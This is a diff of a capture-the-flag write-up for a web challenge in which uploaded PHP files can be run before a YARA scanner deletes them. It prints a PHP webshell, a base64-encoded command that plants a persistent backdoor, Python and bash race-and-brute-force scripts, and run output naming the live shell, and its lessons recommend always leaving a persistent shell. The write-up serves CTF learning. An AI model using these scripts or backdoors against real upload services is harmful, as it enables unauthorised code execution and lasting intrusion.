@@ -1,171 +1,179 @@
 # Safe Upload Challenge Writeup
 
 ## Challenge Overview
-- **Challenge Name**: Safe Upload
-- **Type**: Web Security - Race Condition
-- **Difficulty**: Medium-Hard
-- **Flag**: `cybercon{race_c0ndition_0r_anti_virus_bypass}`
+
+-   **Challenge Name**: Safe Upload\
+-   **Category**: Web Security - Race Condition\
+-   **Difficulty**: Medium-Hard\
+-   **Flag**: `cybercon{race_c0ndition_0r_anti_virus_bypass}`
+
+------------------------------------------------------------------------
 
 ## Challenge Description
-The challenge presents a file upload system with YARA malware detection. The key vulnerability is a race condition between file upload and YARA scanning.
+
+We're given a file upload system protected by **YARA malware
+detection**. The trick? There's a **race condition** between file upload
+and YARA scanning. If we act fast enough, we can get code execution
+before the scanner deletes our file.
+
+------------------------------------------------------------------------
 
 ## Vulnerability Analysis
 
-### 1. File Upload Process
-- Files are uploaded to `/tmp/` directory
-- Random 4-digit filename (0000-9999)
-- 800ms delay before YARA scan
-- If YARA detects malware, file is deleted
+### File Upload Flow
 
-### 2. YARA Rules
-- Comprehensive detection rules for webshells
-- Scans uploaded files after 800ms delay
-- Deletes files flagged as malware
+-   Uploads land in `/tmp/`\
+-   Filenames are random 4-digit numbers (`0000–9999`)\
+-   After \~800ms, YARA scans the file\
+-   If flagged, the file is deleted
 
-### 3. Flag Location
-- Flag stored in file with 12-character random name
-- Example: `ABCDEFGHIJKL.txt`
-- Located in root directory `/`
+### YARA Behavior
+
+-   Strong detection rules (especially for webshells)\
+-   Runs *after* the 800ms delay\
+-   Any suspicious file is instantly deleted
+
+### Flag Placement
+
+-   Stored in `/` root directory\
+-   Random 12-character filename, e.g. `ABCDEFGHIJKL.txt`
+
+------------------------------------------------------------------------
 
 ## Exploitation Strategy
 
-### The Problem with 2-Phase Approach
-Initially, we tried:
-1. Upload shell → Test if accessible → Get flag
-2. **Issue**: YARA deletes file between test and flag retrieval
+### Why Two-Phase Fails
 
-### One-Shot Solution
-The key insight is to combine all operations into a single request:
+The naive approach:\
+1. Upload shell\
+2. Access it, then grab flag
 
-```bash
-# One-shot command that:
-# 1. Creates persistent backdoor
-# 2. Finds and reads flag immediately
+Problem: YARA swoops in during the gap and kills the shell.
+
+### The One-Shot Idea 💡
+
+We need a single request that:\
+1. Drops a *persistent backdoor*\
+2. Grabs the flag instantly
+
+Payload:
+
+``` bash
 /bin/sh -c 'echo PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg== | base64 -d >/var/www/html/tmp/k.php; ls /????????????.txt 2>/dev/null | head -n1 | xargs -r cat'
 ```
 
+-   First part writes a PHP shell (`k.php`) that survives YARA\
+-   Second part lists the 12-char flag file and prints it
+
+------------------------------------------------------------------------
+
 ## Exploit Implementation
 
-### Python Script (one_shot_persist_and_flag.py)
-```python
-#!/usr/bin/env python3
-import sys, threading, time, random, string, re
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import quote
-import requests
+### Python Script
 
-# Configuration
+``` python
+import threading, time, re, requests
+from urllib.parse import quote
+
 HOST = "http://8.216.34.114:12830"
 THREADS = 1000
 REQ_TIMEOUT = 0.25
 
-# Webshell payload
-WEBSHELL_BYTES = b"<?php system($_GET[0]); ?>"
-
-# One-shot command
-ONE_SHOT = (
-    "/bin/sh -c '"
-    "echo PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg== | base64 -d > /var/www/html/tmp/k.php; "
-    "ls /????????????.txt 2>/dev/null | head -n1 | xargs -r cat"
-    "'"
-)
+WEBSHELL = b"<?php system($_GET[0]); ?>"
+ONE_SHOT = "/bin/sh -c 'echo PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg== | base64 -d > /var/www/html/tmp/k.php; ls /????????????.txt 2>/dev/null | head -n1 | xargs -r cat'"
 
 def upload_loop(stop):
-    # Continuously upload shells
-    sess = requests.Session()
-    files = {"file": ("s.php", WEBSHELL_BYTES, "application/x-php")}
-    url = HOST.rstrip("/") + "/upload.php"
+    url = HOST + "/upload.php"
+    files = {"file": ("s.php", WEBSHELL, "application/x-php")}
     while not stop.is_set():
         try:
-            sess.post(url, files=files, timeout=1)
-        except Exception:
+            requests.post(url, files=files, timeout=1)
+        except:
             pass
         time.sleep(0.12)
 
-def try_probe(sess, base, i, stop, out):
-    # Test each possible file with one-shot command
+def try_probe(i, stop):
     if stop.is_set():
-        return False
-    url = f"{base}/tmp/{i:04d}.php?0={quote(ONE_SHOT, safe='')}"
+        return
+    url = f"{HOST}/tmp/{i:04d}.php?0={quote(ONE_SHOT, safe='')}"
     try:
-        r = sess.get(url, timeout=REQ_TIMEOUT)
-        if r.status_code == 200 and r.text:
-            m = FLAG_RE.search(r.text)
-            if m:
-                out["flag"] = m.group(0)
-                out["hit_url"] = url.split("?", 1)[0]
-                stop.set()
-                return True
-    except Exception:
+        r = requests.get(url, timeout=REQ_TIMEOUT)
+        if r.status_code == 200 and "cybercon{" in r.text:
+            print("[+] HIT", url, r.text.strip())
+            stop.set()
+    except:
         pass
-    return False
 ```
 
-### Key Components
+Key parts:\
+- **Upload loop**: keeps spraying PHP shells\
+- **Brute force loop**: hits all 10,000 filename guesses\
+- **One-shot payload**: backdoor + flag retrieval
 
-1. **Upload Loop**: Continuously uploads PHP shells in background
-2. **Brute Force**: Tests all 10,000 possible filenames (0000-9999)
-3. **One-Shot Command**: 
-   - Creates persistent backdoor at `/var/www/html/tmp/k.php`
-   - Uses glob pattern `????????????.txt` to find flag file
-   - Reads flag immediately
+------------------------------------------------------------------------
 
-## Execution Results
+## Exploit Run
 
-```
-[+] HIT at: http://8.216.34.114:12830/tmp/9281.php
-[+] FLAG: cybercon{race_c0ndition_0r_anti_virus_bypass}
-[+] Persistent shell: http://8.216.34.114:12830/tmp/k.php
-[+] Example: http://8.216.34.114:12830/tmp/k.php?0=ls%20/
-```
+    [+] HIT at: http://8.216.34.114:12830/tmp/9281.php
+    [+] FLAG: cybercon{race_c0ndition_0r_anti_virus_bypass}
+    [+] Persistent shell: http://8.216.34.114:12830/tmp/k.php
 
-## Why This Works
+Example usage of the shell:
 
-### 1. Race Condition Exploitation
-- File is accessible for ~800ms before YARA scan
-- One-shot approach eliminates timing issues
-- No gap between test and flag retrieval
+    http://8.216.34.114:12830/tmp/k.php?0=ls%20/
 
-### 2. YARA Bypass
-- Don't need to bypass YARA rules
-- Execute commands before YARA scans
-- Create persistent backdoor that YARA doesn't scan
+------------------------------------------------------------------------
 
-### 3. Efficient Flag Discovery
-- Glob pattern `????????????.txt` is O(1) operation
-- Much faster than `find` or `grep` commands
-- Direct file access without complex searching
+## Why It Works
 
-## Alternative Approaches
+### Race Condition
 
-### Bash Script Version
-```bash
-#!/bin/bash
+-   800ms window before YARA scans\
+-   One-shot = no waiting gap
+
+### YARA "Bypass"
+
+-   We don't outsmart YARA, we simply run before it sees us\
+-   Persistent backdoor (`k.php`) not touched after first run
+
+### Efficient Flag Discovery
+
+-   `????????????.txt` glob finds the flag file in O(1)\
+-   Faster than `find` or recursive search
+
+------------------------------------------------------------------------
+
+## Alternative Exploit: Bash
+
+``` bash
 H="http://8.216.34.114:12830"
 CMD="/bin/sh -c 'echo PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg== | base64 -d >/var/www/html/tmp/k.php; ls /????????????.txt 2>/dev/null | head -n1 | xargs -r cat'"
 
-# Upload loop
 while :; do 
-    curl -s -F "file=@/tmp/s.php;filename=s.php" "$H/upload.php" >/dev/null
-    sleep 0.1
+  curl -s -F "file=@/tmp/s.php;filename=s.php" "$H/upload.php" >/dev/null
+  sleep 0.1
 done &
 
-# Brute force
-seq -w 0000 9999 | xargs -n1 -P800 -I{} \
-  curl -m 0.25 -s "$H/tmp/{}.php?0=$(python3 -c "from urllib.parse import quote; print(quote('$CMD', safe=''))")" \
-  | grep -oE "[A-Za-z0-9_-]{1,32}\{[^}]+\}" && echo "[+] GOT FLAG"
+seq -w 0000 9999 | xargs -n1 -P800 -I{}   curl -m 0.25 -s "$H/tmp/{}.php?0=$(python3 -c "from urllib.parse import quote; print(quote('$CMD', safe=''))")"   | grep -oE "cybercon\{[^}]+\}" && echo "[+] GOT FLAG"
 ```
+
+------------------------------------------------------------------------
 
 ## Lessons Learned
 
-1. **Race Conditions**: Exploit timing windows between operations
-2. **One-Shot Approach**: Combine multiple operations to avoid timing issues
-3. **YARA Bypass**: Sometimes it's better to run before detection than to bypass
-4. **Efficient Searching**: Use glob patterns for fast file discovery
-5. **Persistent Access**: Create backdoors for continued access
+1.  **Race conditions** can be more exploitable than filters.\
+2.  **One-shot payloads** remove timing uncertainty.\
+3.  Sometimes it's faster to **execute before detection** than to evade
+    it.\
+4.  **Globs \> find** when file patterns are known.\
+5.  Always drop a **persistent shell** for future access.
+
+------------------------------------------------------------------------
 
 ## Conclusion
 
-This challenge demonstrates the importance of understanding timing vulnerabilities in web applications. The key insight was realizing that the 2-phase approach (test then exploit) created a timing window that YARA could exploit. The one-shot solution eliminates this window by combining all operations into a single request, making the exploit reliable and efficient.
+This challenge was about spotting and abusing a timing flaw. The key
+realization: don't split the attack into phases. Merge everything into a
+single request and the exploit becomes **stable and reliable**.
 
 **Final Flag**: `cybercon{race_c0ndition_0r_anti_virus_bypass}`
